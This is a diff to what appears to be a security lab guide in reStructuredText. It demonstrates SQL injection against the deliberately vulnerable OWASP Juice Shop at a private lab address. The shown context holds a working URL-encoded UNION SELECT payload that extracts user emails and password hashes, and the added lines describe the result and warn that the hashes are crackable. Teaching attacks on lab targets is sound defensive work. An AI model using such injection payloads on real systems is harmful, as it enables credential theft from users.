@@ -45,6 +45,13 @@ Here is the vulnerable Juiceshop application. Next, we will try a simple SQL inj
 
     https://10.1.20.200/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20Users--
 
+This will cause the application to dump a list of users in the database to include their hashed passwords. **YIKES!**
+
+  .. image:: ../images/juiceshop-sql.png
+
+
+  .. warning:: An attacked could easily grab the hashed passwords and decrypt in a free password hash cracker widely available on the internet.
+
 
 
   
